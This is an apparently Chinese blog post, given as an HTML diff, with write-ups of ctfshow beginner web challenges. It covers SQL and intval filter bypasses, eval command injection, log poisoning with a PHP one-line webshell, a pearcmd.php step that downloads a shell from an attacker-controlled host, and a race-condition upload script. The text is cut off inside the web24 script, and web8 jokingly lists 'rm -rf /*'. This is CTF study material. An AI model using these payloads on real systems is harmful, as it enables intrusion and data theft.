@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ctfshow_萌新 |  b1xcy&#39;s blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ctfshow_萌新"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ctfshow_萌新
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/09/19/ctfshow_%E8%90%8C%E6%96%B0/" class="article-date">
+  <time datetime="2023-09-19T10:17:57.472Z" itemprop="datePublished">2023-09-19</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">11 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>目标就是让intval($id) &lt;&#x3D; 999的同时$id&#x3D;1000</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=999%2B1</span><br><span class="line">+用urlencode-&gt;%2B</span><br><span class="line">?id=10 or id=1000#从sql语句入手</span><br></pre></td></tr></table></figure>
+
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>和上一题比只多了个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/or|\+/i&quot;,$id))</span><br></pre></td></tr></table></figure>
+
+<p>只要不出现or或者+就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=100*10</span><br><span class="line">?id=10||id=1000#从sql语句入手</span><br></pre></td></tr></table></figure>
+
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>修改了匹配规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id)</span><br></pre></td></tr></table></figure>
+
+<p>intval如果转换字符串的时候，先判断是否以数字开头。当传入’1000’时，以’开头，直接返回0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;1000&#x27;</span><br><span class="line">$b=$_GET[&#x27;b&#x27;]</span><br><span class="line">当传入?b=&#x27;1000&#x27;时,分别var_dump $a和$b,返回的结果不一样</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;1000&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>
+
+<p>还是web3的原则，利用取反符号，intval遇到~会判断为字符串，得到0绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>
+
+<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;, $id)</span><br></pre></td></tr></table></figure>
+
+<p>继续取反</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>
+
+<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>
+
+<p>继续</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>
+
+<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>
+
+<p>intval默认给的base是10，当base给到0的时候，才会根据传入的值动态判断base。base10解析之后的0b1111101000应该是int(0)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0b1111101000</span><br></pre></td></tr></table></figure>
+
+<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件,key flag 也在里面定义</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line">        if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line">                $f = $_GET[&#x27;flag&#x27;];</span><br><span class="line">                if($key===$f)&#123;</span><br><span class="line">                        echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>傻逼题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=rm -rf /*</span><br></pre></td></tr></table></figure>
+
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">        if(preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123;</span><br><span class="line">                eval($c);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;cmd error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>傻逼了，以为看的是!preg_match，最开始用的php:&#x2F;&#x2F;input伪协议绕过</p>
+<p>结果这么简单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&#x27;cat config&#x27;|base64)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>换用passthru()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(&#x27;cat config.php|base64&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>passthru+tac</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(&#x27;tac config.php|base64&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\.|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>禁止的字符新增了. php config</p>
+<p>考虑使用通配符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(&#x27;tac c*|base64&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>亏贼，<code>?&gt;</code>能代替<code>;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(&#x27;tac c*|base64&#x27;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>多加了个(，其实还挺低能的，在上面也能用统一方法直接echo出来</p>
+<p>就是需要把;换成?&gt;</p>
+<p>参考</p>
+<blockquote>
+<p>代码不能包含打开&#x2F;关闭 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php">PHP tags</a>。比如， <code>&#39;echo &quot;Hi!&quot;;&#39;</code> 不能这样传入： <code>&#39;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#39;</code>。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 <code>&#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;&#39;</code>。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo $flag?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>把&lt;&gt;?全过滤了，没发离开php模式，但没禁用;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo $flag;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(md5(&quot;ctfshow$c&quot;)===&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>脑残，md5逆向之后是ctfshow36d</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=36d</span><br></pre></td></tr></table></figure>
+
+<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/php/i&quot;,$c))&#123;</span><br><span class="line">               include($c);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到include，第一时间想的伪协议。换用了data也因为被禁用没有成功</p>
+<p><code>data:// wrapper is disabled in the server configuration by allow_url_include=0</code></p>
+<p>看了wp才知道，只是包含日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>通过日志看得出来会记录UA</p>
+<p>那就修改UA为一句话木马</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181325686.png" alt="image-20230918132518605"></p>
+<p>然后访问带着一句话木马的UA访问一遍网站，等写进去再打一遍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br><span class="line">test=system(&#x27;cat 36d.php|base64&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>只在$_GET[‘c’]里多加入了对file的过滤，同上↑</p>
+<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|base/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>同理</p>
+<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|base|rot/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>同理</p>
+<h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|\:|base|rot/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>同上</p>
+<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/\:|\/|\\\/i&quot;,$c))</span><br></pre></td></tr></table></figure>
+
+<p>亏贼，难度一下上来了，完全没有思路</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108954166">https://blog.csdn.net/qq_46091464/article/details/108954166</a></p>
+<blockquote>
+<p>‘<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.argv.php">argv</a>‘</p>
+<p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p>
+<p>‘<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.argc.php">argc</a>‘</p>
+<p>包含命令行模式下传递给该脚本的参数的数目(如果运行在命令行模式下)。</p>
+</blockquote>
+<p>当正常传入?c&#x3D;xxx&amp;b&#x3D;xx时，$_SERVER[‘argc’]的值始终是1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181651302.png" alt="image-20230918165121242"></p>
+<p>但是略加修改，?c&#x3D;xxx&amp;+b&#x3D;xx时，就变成了2。</p>
+<p>而环境内极其傻逼的还有一个pearcmd.php，pearcmd有一个download功能可以从外部下载php文件</p>
+<p>那就是包含了pearcmd.php，然后通过+分隔，执行download命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击机:</span><br><span class="line">echo &quot;&lt;?php system(&#x27;cat 3*|base64&#x27;);?&gt;&quot;&gt;shell.php</span><br><span class="line">python3 -m http.server 81</span><br><span class="line">靶机:</span><br><span class="line">?c=pearcmd&amp;+download+http://ip:81/shell.php</span><br><span class="line">/shell.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="获得百分之百的快乐"><a href="#获得百分之百的快乐" class="headerlink" title="获得百分之百的快乐"></a>获得百分之百的快乐</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(strlen($_GET[1])&lt;4)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要求传入1的长度&lt;4，太牛逼了</p>
+<p>直接跑个ls，发现名字都很靠后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181755031.png" alt="image-20230918175530980"></p>
+<p>tip:在linux上，直接执行&gt;name可以创建一个名为name的文件并往里写东西</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181757349.png" alt="image-20230918175716313"></p>
+<blockquote>
+<p>在Linux的Shell环境下，直接执行星号（*）通常会触发通配符展开（Wildcard Expansion）操作，其效果是匹配当前目录下的所有文件和目录（除了以点开头的隐藏文件和隐藏目录）并将它们作为参数传递给相应的命令。这是因为星号（*）是通配符，用于匹配零个或多个字符。</p>
+</blockquote>
+<p>直接输*会把当前文件夹下的第一个文件名作为命令，剩余的文件名作为参数</p>
+<p>如果当前文件夹下有文件：cat，test。执行*的效果等价于cat test</p>
+<p>除了cat，还有nl这个命令同样可以用来显示内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=&gt;nl</span><br><span class="line">?1=*</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>第一次遇到竞争上传，学习一下</p>
+<p>其实每次上传成功之后都要等一下就该意识到有个sleep然后想到竞争上传的</p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$new_filename = date(&#x27;YmdHis&#x27;,time()).rand(100,1000).&#x27;.&#x27;.$ext_suffix;</span><br><span class="line">if (move_uploaded_file($temp_name, &#x27;uploads/&#x27;.$new_filename))&#123;</span><br><span class="line">	echo &quot;uploads/$new_filename&quot;;</span><br><span class="line">	sleep(1);</span><br><span class="line">	system(&quot;rm -rf ./uploads/*.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有爆破脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"># Auth: y2hlbmc</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url = &quot;http://0d33429a-38e4-4c4e-8d57-16fca7d5eab1.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">def Thread(fun,*args):</span><br><span class="line">    return threading.Thread(target=fun, args=args)</span><br><span class="line"> </span><br><span class="line">def req(fname):</span><br><span class="line">    r = requests.get(url + &quot;uploads/&quot; + fname + &quot;.php&quot;)</span><br><span class="line">    x = r.text</span><br><span class="line">    if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;容器已过期&quot; not in x:</span><br><span class="line">        print(x)</span><br><span class="line"> </span><br><span class="line">def Thread_start(fname):</span><br><span class="line">    for i in range(100,400):</span><br><span class="line">        # 每个文件名单起一个线程</span><br><span class="line">        Thread(req, fname + str(i)).start()</span><br><span class="line"> </span><br><span class="line">def upload():</span><br><span class="line">    while True:</span><br><span class="line">    	# 指定每次上传文件的内容</span><br><span class="line">        file_data = &#123;&#x27;file&#x27;:(&#x27;shell.php&#x27;,&quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">        r = requests.post(url + &quot;upload.php&quot;,files=file_data)</span><br><span class="line">        txt = r.text</span><br><span class="line">        print(&quot;uploaded:&quot;,txt)</span><br><span class="line">        # 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔</span><br><span class="line">        ts = int(time.mktime(time.strptime(txt[8:22], &quot;%Y%m%d%H%M%S&quot;)))</span><br><span class="line">        fname = time.strftime(&quot;%Y%m%d%H%M%S&quot;, time.localtime(ts + 1))</span><br><span class="line">        # 单起一个线程，爆破下一次upload的文件名</span><br><span class="line">        Thread(Thread_start, fname).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以用bp+python一起爆</p>
+<p>具体思路是bp用instruder一直发送上传包</p>
+<p>python用当前时间+range+thread一直爆</p>
+<p>如果不采用推算文件名和多线程的方法，想要在来回时延下做到1s内访问到是非常困难的，所以下面代码的成功率极低</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file_data = &#123;&#x27;file&#x27;: (&#x27;shell.php&#x27;, &quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">r = requests.post(url + &quot;upload.php&quot;, files = file_data)</span><br><span class="line">txt = r.text</span><br><span class="line"># print(&quot;uploaded:&quot;, txt)</span><br><span class="line">r = requests.get(url + &quot;uploads/&quot; + txt)</span><br><span class="line">x = r.text</span><br><span class="line">if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;容器已过期&quot; not in x:</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>一样是竞争上传的题目，把range减少，时间增加了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"># Auth: y2hlbmc</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url = 